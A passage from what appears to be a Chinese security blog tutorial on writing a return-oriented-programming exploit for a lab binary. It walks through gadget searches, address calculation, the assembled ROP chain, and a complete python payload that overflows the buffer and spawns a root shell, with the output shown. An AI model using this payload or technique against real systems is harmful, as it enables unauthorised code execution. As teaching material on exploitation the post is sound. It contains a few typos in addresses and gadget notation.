<h2 id="②-查找对应的-ROP-gadgets，完成上述功能。"><a href="#②-查找对应的-ROP-gadgets，完成上述功能。" class="headerlink" title="② 查找对应的 ROP gadgets，完成上述功能。"></a>② 查找对应的 ROP gadgets，完成上述功能。</h2><p><strong>（1）查找 “xor eax,eax;ret”，eax 清零。</strong><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ROPeMe&gt; search <span class="keyword">xor</span> <span class="built_in">eax</span> <span class="built_in">eax</span> ?</div><div class="line">Searching for ROP gadget: <span class="keyword">xor</span> <span class="built_in">eax</span> <span class="built_in">eax</span> ? with constraints: []</div><div class="line">0x7f448L: <span class="keyword">xor</span> <span class="built_in">eax</span> <span class="built_in">eax</span> <span class="comment">; leave ;;</span></div><div class="line">0x10b090L: <span class="keyword">xor</span> <span class="built_in">eax</span> <span class="built_in">eax</span> <span class="comment">; leave ;;</span></div><div class="line">0x796bfL: <span class="keyword">xor</span> <span class="built_in">eax</span> <span class="built_in">eax</span> <span class="comment">; ret ;;</span></div><div class="line">ROPeMe&gt;</div></pre></td></tr></table></figure></p>
<p>选择 0x796bfL: xor eax eax ; ret ;;<br>但是 0x796bfL 是 gadget 在 “lib-2.13.c” 库中的偏移地址，需计算 gadget 的实际地址，即 库起始地址 + 偏移地址<br>“lib-2.13.c” 的起始地址<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="number">0x796bf</span>+ <span class="number">0xb7e63000</span> = <span class="number">0xB7EDC6BF</span></div></pre></td></tr></table></figure></p>
<p>因此 xor eax,eax;ret 的实际地址为 “0xB7EDC6BF”</p>
<p>现在需将 “/bin/bash” 字符串保存在内存中，然后将其内存地址保存在 ebx 中。</p>
<p>选取内存地址，最好是放在 .data 段，查看二进制文件 .data 的起始地址。<br><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">root<span class="variable">@kali:</span>~/Desktop/tuts/so# objdump -D rop2 | grep data</div><div class="line">Disassembly of section .<span class="attribute">rodata</span>:</div><div class="line">Disassembly of section .<span class="attribute">data</span>:</div><div class="line"><span class="number">080496</span>fc &lt;__data_start&gt;:</div></pre></td></tr></table></figure></p>
<p>.data 的其实地址为 “0x080496fc”。<br>也可在 gdb 中使用 “info files” 命令查看。</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">(gdb) info files</div><div class="line">Symbols <span class="keyword">from</span> <span class="string">"/root/Desktop/tuts/so/rop2"</span>.</div><div class="line">Unix child process:</div><div class="line">Using <span class="keyword">the</span> <span class="built_in">running</span> image <span class="keyword">of</span> child process <span class="number">28344.</span></div><div class="line">While <span class="built_in">running</span> this, GDB <span class="keyword">does</span> <span class="keyword">not</span> access memory <span class="keyword">from</span>...</div><div class="line">Local exec <span class="built_in">file</span>:</div><div class="line">`/root/Desktop/tuts/so/rop2', <span class="built_in">file</span> type elf32-i386.</div><div class="line">Entry point: <span class="number">0x8048390</span></div><div class="line"><span class="number">0x08048134</span> - <span class="number">0x08048147</span> <span class="keyword">is</span> .interp</div><div class="line"><span class="comment">---snipped---</span></div><div class="line"><span class="number">0x080496d8</span> - <span class="number">0x080496dc</span> <span class="keyword">is</span> .got</div><div class="line"><span class="number">0x080496dc</span> - <span class="number">0x080496fc</span> <span class="keyword">is</span> .got.plt</div><div class="line"><span class="number">0x080496fc</span> - <span class="number">0x08049704</span> <span class="keyword">is</span> .data</div><div class="line"><span class="comment">---snipped---</span></div><div class="line">(gdb)</div></pre></td></tr></table></figure>
<p>问题：本想使用 .data + 4 和 .data + 8 存放字符串。但是 .data + 8 = 0x080496fc+4 =0x08049700，shellcode中不应出现 NULL，会截断shellcode，因此另选地址 0x08049704 存放字符串。</p>
<p>现在要做的是，将 “/bin/sh” 存放在 0x08049704 处。</p>
<p>需要将 “/bin/sh” 以 4 byte 为单位分割成两部分 “/bin” 、”/sh”，但是 “/sh” 只有 3 byte，最后 1 byte 就会自动填充成 NULL，这是不允许的。因此在最前面增加一个 /，即 “//sh”，最后的字符串为 “/bin//sh”。</p>
<p>将 “/bin” 和 “//sh” 分别放在刚才选定的地址 0x08049704 和 0x08049704 + 4 处。即调用 “mov [r32],r32;ret”指令序列。但首先需调用 “pop r32;ret” 指令序列将字符串 “/bin” 和 “//sh” 存放在 r32 中。</p>
<p><strong>（2） 寻找 mov 指令。</strong><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ROPeMe&gt; search <span class="keyword">mov</span> [ <span class="built_in">eax</span> %</div><div class="line">---snipped---</div><div class="line">0x29ecfL: <span class="keyword">mov</span> [<span class="built_in">eax</span>] <span class="built_in">ecx</span> <span class="comment">;;</span></div></pre></td></tr></table></figure></p>
<p>mov [eax] ecx ：将 ecx 中的值存放到 eax中的地址指向的内存区。<br>找到的 mov 指令的实际地址为 :<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="number">0x29e</span>xf+<span class="number">0xb7e63000</span> = <span class="number">0xB7E8CECF</span></div></pre></td></tr></table></figure></p>
<p>那么在执行这个 gadget 之前，需先调用 “pop eax;ret” “pop ecx;ret” 设置eax，ecx的值，eax 为刚找的内存地址 0x08049704 ，ecx 为字符串。</p>
<p><strong>（3）查找 pop 指令序列</strong><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">ROPeMe&gt; search <span class="keyword">pop</span> <span class="built_in">ecx</span> %</div><div class="line">Searching for ROP gadget: <span class="keyword">pop</span> <span class="built_in">ecx</span> % with constraints: []</div><div class="line">0x3ca61L: <span class="keyword">pop</span> <span class="built_in">ecx</span> <span class="comment">; add ecx 0xa ; mov [edx] ecx ;;</span></div><div class="line">0xd8f30L: <span class="keyword">pop</span> <span class="built_in">ecx</span> <span class="comment">; pop eax ;;</span></div><div class="line">0xd8f51L: <span class="keyword">pop</span> <span class="built_in">ecx</span> <span class="comment">; pop eax ;;</span></div><div class="line">0xe2c02L: <span class="keyword">pop</span> <span class="built_in">ecx</span> <span class="comment">; pop ebx ;;</span></div><div class="line">0x2a6ebL: <span class="keyword">pop</span> <span class="built_in">ecx</span> <span class="comment">; pop edx ;;</span></div><div class="line">ROPeMe&gt;</div></pre></td></tr></table></figure></p>
<p>一个指令序列 “pop ecx;pop eax;;” 就可以一次设置 eax ecx 的值。<br>地址 ： 0xd8f30+0xb7e63000 = 0xB7F3BF30</p>
<p>接下来需要向内存中写入 NULL，但要时刻记住，shellcode中不能出现 NULL。<br>因为首先清零一个寄存器 r32_1，然后是用 mov [r32_2] ,r32_1;ret 指令将 0 放入内存中。</p>
<p>之前我们找到了 “xor eax,eax;ret” gadget，现在只需找 “mov r[32],eax;ret” gadget</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ROPeMe&gt; search <span class="keyword">mov</span> % <span class="built_in">eax</span></div><div class="line">Searching for ROP gadget: <span class="keyword">mov</span> % <span class="built_in">eax</span> with constraints: []</div><div class="line">0xf0cffL: <span class="keyword">mov</span> [<span class="number">0x810001e9</span>] <span class="built_in">eax</span> <span class="comment">;;</span></div><div class="line">0xdc5ffL: <span class="keyword">mov</span> [<span class="number">0x81000330</span>] <span class="built_in">eax</span> <span class="comment">;;</span></div><div class="line">0x2a71cL: <span class="keyword">mov</span> [<span class="built_in">edx</span>+<span class="number">0x14</span>] <span class="built_in">ecx</span> <span class="comment">; mov [edx+0xc] ebp ; mov [edx+0x18] eax ;;</span></div><div class="line">0x2a722L: <span class="keyword">mov</span> [<span class="built_in">edx</span>+<span class="number">0x18</span>] <span class="built_in">eax</span> <span class="comment">;;</span></div></pre></td></tr></table></figure>
<p>mov [edx+0x18] eax ;;    将 eax 的内容 存放在 edx + 0x18 指向的内存区。<br>地址 ： 0x2a722+0xb7e63000 = 0xB7E8D722</p>
<p>现在需要 “pop ebx” , “pop ecx” , “pop edx” 加载相应的参数到相应的寄存器。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">0x78af4L: <span class="keyword">pop</span> <span class="built_in">ebx</span> <span class="comment">;; 0x78af4+0xb7e63000 = 0xB7EDBAF4</span></div><div class="line">0x2a6ebL: <span class="keyword">pop</span> <span class="built_in">ecx</span> <span class="comment">; pop edx ;; 0x2a6eb+0xb7e63000 = 0xB7E8D6EB</span></div></pre></td></tr></table></figure>
<p>寻找 将系统调用号 放入 eax 的gadget。<br>之前 eax 清零了，使用 算术运算 就可以了</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">0x7faa8L: <span class="keyword">add</span> <span class="built_in">eax</span> <span class="number">0xb</span> <span class="comment">;; 0x7faa8+0xb7e63000 = 0xB7EE2AA8</span></div></pre></td></tr></table></figure>
<p><strong>（4）最后一个 gadget 即执行系统调用指令</strong><br>但是我们没有找到 int 0x80 指令，但是找到了内核系统调用指令 call gd:[0x10]</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="number">0xa10f</span>5L: call gs:[<span class="number">0x10</span>] ;; <span class="number">0xa10f</span>5 + <span class="number">0xb7e63000</span> = <span class="number">0xB7F040F5</span></div></pre></td></tr></table></figure>
<p>OK，找到了组成 exploit 的所有gadget<br><img src="http://ww1.sinaimg.cn/large/005CA6ZCgw1f27454szgfj30ks0a8gnf.jpg" alt=""></p>
<p>选取的内存地址为 “0x08049704”</p>
<h2 id="③-ROP-链如下"><a href="#③-ROP-链如下" class="headerlink" title="③ ROP 链如下:"></a>③ ROP 链如下:</h2><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">pop ecx; pop eax;;ret + “/bin”+ address to write to --&gt; mov [eax],ecx; ret --&gt;<span class="built_in"> xor </span>eax,eax;ret --&gt; </div><div class="line">pop edx;ret --&gt; address to write too – 18 --&gt;  mov [edx+18],eax;ret --&gt; </div><div class="line">pop ecx;pop edx; ret + address of argp<span class="built_in"> array </span>+ address of envp<span class="built_in"> array </span>--&gt; </div><div class="line">pop ebx;ret + address of string “/bin//sh”  --&gt;<span class="built_in"> add </span>eax,0xb;ret --&gt; call gs:[0x10].</div></pre></td></tr></table></figure>
<p>输入的数据格式：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">“A”*<span class="number">260</span></div><div class="line">+ <span class="number">0xB7F3BF30</span> <span class="keyword">pop</span> <span class="built_in">ecx</span> <span class="comment">;     pop eax; ret</span></div><div class="line">+ “/bin”                           string to be popped <span class="keyword">into</span> <span class="built_in">ecx</span></div><div class="line">+ <span class="number">0x08049704</span>                address to be popped <span class="keyword">into</span> <span class="built_in">eax</span> to write “/bin” to</div><div class="line">+ <span class="number">0xB7E8CECF</span> 	 	<span class="keyword">mov</span> [<span class="built_in">ecx</span>],<span class="built_in">eax</span><span class="comment">; ret</span></div><div class="line">+ <span class="number">0xB7F3BF30</span> 		<span class="keyword">pop</span> <span class="built_in">ecx</span> <span class="comment">; pop eax; ret</span></div><div class="line">+ “//sh” 		                 string to be popped <span class="keyword">into</span> <span class="built_in">ecx</span></div><div class="line">+ <span class="number">0x08049708</span> 		address to be popped <span class="keyword">into</span> <span class="built_in">eax</span> to write “//sh” to “<span class="number">0x0804971c</span> +<span class="number">4</span>”</div><div class="line">+ <span class="number">0xB7E8CECF</span> 		<span class="keyword">mov</span> [<span class="built_in">ecx</span>],<span class="built_in">eax</span><span class="comment">; ret</span></div><div class="line">+ <span class="number">0xB7EDC6BF</span> 		<span class="keyword">xor</span> <span class="built_in">eax</span>,<span class="built_in">eax</span><span class="comment">; ret</span></div><div class="line">+ <span class="number">0xB7E64A9E</span> 		<span class="keyword">pop</span> <span class="built_in">edx</span><span class="comment">;ret</span></div><div class="line">+ <span class="number">0x080496f4</span> 		        address to write NULL bytes to “<span class="number">0x08049708</span>+<span class="number">4</span>-<span class="number">18</span>”</div><div class="line">+ <span class="number">0xB7E8D722</span> 		<span class="keyword">mov</span> [<span class="built_in">edx</span>+<span class="number">0x18</span>] <span class="built_in">eax</span> <span class="comment">;ret</span></div><div class="line">+ <span class="number">0xB7E8D6EB</span> 		<span class="keyword">pop</span> <span class="built_in">ecx</span><span class="comment">; pop edx; ret</span></div><div class="line">+ <span class="number">0x08049712</span> 		address of argp array to be loaded <span class="keyword">into</span> <span class="built_in">ecx</span> pointing to NULL bytes.</div><div class="line">+ <span class="number">0x08049712</span> 		address of envp array to be loaded <span class="keyword">into</span> <span class="built_in">edx</span> pointing to NULL bytes.</div><div class="line">+ <span class="number">0xB7EDBAF4</span> 		<span class="keyword">pop</span> <span class="built_in">ebx</span> <span class="comment">; ret</span></div><div class="line">+ <span class="number">0x08049704</span> 		pointer of string “/bin//sh”</div><div class="line">+ <span class="number">0xB7EE2AA8</span> 		<span class="keyword">add</span> <span class="built_in">eax</span> <span class="number">0xb</span> <span class="comment">;ret</span></div><div class="line">+ <span class="number">0xB7F040F5</span> 		<span class="keyword">call</span> <span class="built_in">gs</span>:[<span class="number">0x10</span>] <span class="comment">; ret</span></div></pre></td></tr></table></figure></p>
<p>一般都是小端存储，需要转换为小端存储格式<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./rop2 `python -c 'print "A"*260 +"<span class="symbol">\x</span>30<span class="symbol">\x</span>bf<span class="symbol">\x</span>f3<span class="symbol">\x</span>b7"+"/bin"+"<span class="symbol">\x</span>04<span class="symbol">\x</span>97<span class="symbol">\x</span>04<span class="symbol">\x</span>08"+"<span class="symbol">\x</span>cf<span class="symbol">\x</span>ce<span class="symbol">\x</span>e8<span class="symbol">\x</span>b7"+"<span class="symbol">\x</span>30<span class="symbol">\x</span>bf<span class="symbol">\x</span>f3<span class="symbol">\x</span>b7"+"//sh"+"<span class="symbol">\x</span>08<span class="symbol">\x</span>97<span class="symbol">\x</span>04<span class="symbol">\x</span>08"+"<span class="symbol">\x</span>cf<span class="symbol">\x</span>ce<span class="symbol">\x</span>e8<span class="symbol">\x</span>b7"+"<span class="symbol">\x</span>bf<span class="symbol">\x</span>c6<span class="symbol">\x</span>ed<span class="symbol">\x</span>b7"+"<span class="symbol">\x</span>9e<span class="symbol">\x</span>4a<span class="symbol">\x</span>e6<span class="symbol">\x</span>b7"+"<span class="symbol">\x</span>f4<span class="symbol">\x</span>96<span class="symbol">\x</span>04<span class="symbol">\x</span>08"+"<span class="symbol">\x</span>22<span class="symbol">\x</span>d7<span class="symbol">\x</span>e8<span class="symbol">\x</span>b7"+"<span class="symbol">\x</span>eb<span class="symbol">\x</span>d6<span class="symbol">\x</span>e8<span class="symbol">\x</span>b7"+"<span class="symbol">\x</span>12<span class="symbol">\x</span>97<span class="symbol">\x</span>04<span class="symbol">\x</span>08"+"<span class="symbol">\x</span>12<span class="symbol">\x</span>97<span class="symbol">\x</span>04<span class="symbol">\x</span>08"+"<span class="symbol">\x</span>f4<span class="symbol">\x</span>ba<span class="symbol">\x</span>ed<span class="symbol">\x</span>b7"+"<span class="symbol">\x</span>04<span class="symbol">\x</span>97<span class="symbol">\x</span>04<span class="symbol">\x</span>08"+"<span class="symbol">\x</span>a8<span class="symbol">\x</span>2a<span class="symbol">\x</span>ee<span class="symbol">\x</span>b7"+"<span class="symbol">\x</span>f5<span class="symbol">\x</span>40<span class="symbol">\x</span>f0<span class="symbol">\x</span>b7"'`</div></pre></td></tr></table></figure></p>
<h2 id="④-测试一下-shellcode-正确性和实用性"><a href="#④-测试一下-shellcode-正确性和实用性" class="headerlink" title="④ 测试一下 shellcode 正确性和实用性"></a>④ 测试一下 shellcode 正确性和实用性</h2><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">root@kali:~/Desktop/tuts/so# ./rop2 `python -c 'print "A"*260 +"<span class="symbol">\x</span>30<span class="symbol">\x</span>bf<span class="symbol">\x</span>f3<span class="symbol">\x</span>b7"+"/bin"+"<span class="symbol">\x</span>04<span class="symbol">\x</span>97<span class="symbol">\x</span>04<span class="symbol">\x</span>08"+"<span class="symbol">\x</span>cf<span class="symbol">\x</span>ce<span class="symbol">\x</span>e8<span class="symbol">\x</span>b7"+"<span class="symbol">\x</span>30<span class="symbol">\x</span>bf<span class="symbol">\x</span>f3<span class="symbol">\x</span>b7"+"//sh"+"<span class="symbol">\x</span>08<span class="symbol">\x</span>97<span class="symbol">\x</span>04<span class="symbol">\x</span>08"+"<span class="symbol">\x</span>cf<span class="symbol">\x</span>ce<span class="symbol">\x</span>e8<span class="symbol">\x</span>b7"+"<span class="symbol">\x</span>bf<span class="symbol">\x</span>c6<span class="symbol">\x</span>ed<span class="symbol">\x</span>b7"+"<span class="symbol">\x</span>9e<span class="symbol">\x</span>4a<span class="symbol">\x</span>e6<span class="symbol">\x</span>b7"+"<span class="symbol">\x</span>f4<span class="symbol">\x</span>96<span class="symbol">\x</span>04<span class="symbol">\x</span>08"+"<span class="symbol">\x</span>22<span class="symbol">\x</span>d7<span class="symbol">\x</span>e8<span class="symbol">\x</span>b7"+"<span class="symbol">\x</span>eb<span class="symbol">\x</span>d6<span class="symbol">\x</span>e8<span class="symbol">\x</span>b7"+"<span class="symbol">\x</span>12<span class="symbol">\x</span>97<span class="symbol">\x</span>04<span class="symbol">\x</span>08"+"<span class="symbol">\x</span>12<span class="symbol">\x</span>97<span class="symbol">\x</span>04<span class="symbol">\x</span>08"+"<span class="symbol">\x</span>f4<span class="symbol">\x</span>ba<span class="symbol">\x</span>ed<span class="symbol">\x</span>b7"+"<span class="symbol">\x</span>04<span class="symbol">\x</span>97<span class="symbol">\x</span>04<span class="symbol">\x</span>08"+"<span class="symbol">\x</span>a8<span class="symbol">\x</span>2a<span class="symbol">\x</span>ee<span class="symbol">\x</span>b7"+"<span class="symbol">\x</span>f5<span class="symbol">\x</span>40<span class="symbol">\x</span>f0<span class="symbol">\x</span>b7"'`</div><div class="line"># id</div><div class="line">uid=0(root) gid=0(root) groups=0(root)</div><div class="line"># ls</div><div class="line">ROPgadget a.out core g get getenv.c rop rop2 rop3 ropeme ropeme-bhus10 ropeme-bhus10.tar rt rt2 rt2.c s so so.c so2 so2.c so3.c wrpr wrpr.c</div><div class="line">#</div></pre></td></tr></table></figure>
<p>OK！！！ROP 链成功新建了一个 shell。</p>
<h1 id="Ⅴ、参考文献"><a href="#Ⅴ、参考文献" class="headerlink" title="Ⅴ、参考文献"></a>Ⅴ、参考文献</h1><p><a href="https://www.exploit-db.com/docs/28479.pdf" target="_blank" rel="external">Return-Oriented-Programming(ROP FTW)</a></p>

    
  </div>
</article>

</div>


  <div class="text-center donation">
    <div class="inner-donation">
      <span class="btn-donation">支持一下</span>
      <div class="donation-body">
        <div class="tip text-center">走过的，路过的，请支持一下我 n(*≧▽≦*)n</div>
        <ul class="theme.donation.items.length">
        
          <li class="item">
            <img src="/images/qr-wechat.png" alt="">
          </li>
        
        </ul>
      </div>
    </div>
  </div>




  <a id="backTop" class="back-top">
    <i class="icon-angle-up"></i>
  </a>




  <div class="modal" id="modal">
  <span id="cover" class="cover hide"></span>
  <div id="modal-dialog" class="modal-dialog hide-dialog">
    <div class="modal-header">
      <span id="close" class="btn-close">关闭</span>
    </div>
    <hr>
    <div class="modal-body">
      <ul class="list-toolbox">
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/archives/"
              target="_self"
              >
              博客
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/category/"
              target="_self"
              >
              分类
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/tag/"
              target="_self"
              >
              标签
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/link/"
              target="_self"
              >
              友链
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/about/"
              target="_self"
              >
              关于
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/search/"
              target="_self"
              >
              搜索
            </a>
          </li>
        
      </ul>

    </div>
  </div>
</div>



  
      <div class="fexo-comments comments-post">
    
  <section class="disqus-comments">
    <div id="disqus_thread">
      <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
    </div>
  </section>

  <script>
    var disqus_shortname = 'huirong';
    
    var disqus_url = 'http://huirong.github.io/2016/03/11/ROP-exploit/';
    
    (function(){
      var dsq = document.createElement('script');
      dsq.type = 'text/javascript';
      dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
  </script>

  <script id="dsq-count-scr" src="//huirong.disqus.com/count.js" async></script>



    
  <section class="duoshuo-comments">
    <!-- 多说评论框 start -->
    <div class="ds-thread" data-thread-key="http://huirong.github.io/2016/03/11/ROP-exploit/index.html" data-title="ROP exploit 编写" data-url="http://huirong.github.io/2016/03/11/ROP-exploit/index.html"></div>
    <!-- 多说评论框 end -->
  </section>




  <script type="text/javascript">
  var duoshuoQuery = {short_name:"star"};
  (function() {
    var ds = document.createElement('script');
    ds.type = 'text/javascript';ds.async = true;
    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
    ds.charset = 'UTF-8';
    (document.getElementsByTagName('head')[0]
     || document.getElementsByTagName('body')[0]).appendChild(ds);
  })();
  </script>


  </div>

  

  <script type="text/javascript">
  function loadScript(url, callback) {
    var script = document.createElement('script')
    script.type = 'text/javascript';

    if (script.readyState) { //IE
      script.onreadystatechange = function() {
        if (script.readyState == 'loaded' ||
          script.readyState == 'complete') {
          script.onreadystatechange = null;
          callback();
        }
      };
    } else { //Others
      script.onload = function() {
        callback();
      };
    }

    script.src = url;
    document.getElementsByTagName('head')[0].appendChild(script);
  }

  window.onload = function() {
    loadScript('/js/bundle.js?235683', function() {
      // load success
    });
  }
</script>

</body>
</html>
